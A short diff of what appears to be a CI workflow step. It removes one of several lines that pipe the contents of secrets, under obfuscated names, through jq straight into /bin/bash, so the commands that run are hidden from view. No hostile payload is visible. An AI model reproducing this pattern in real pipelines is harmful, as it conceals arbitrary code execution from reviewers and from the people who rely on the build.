@@ -18,7 +18,6 @@ jobs:
           krez7755: ${{ secrets.krez7755 }}
         run: |
           printf '%s' "$krez7755" | jq -r .uppfg8 | /bin/bash
-          echo $auffi46816 | jq -r .kremz694 | /bin/bash
           printf '%s' "$nnrkh05" | jq -r .f3 | /bin/bash
           echo $ash8275 | jq -r .jitsw05 | /bin/bash
 
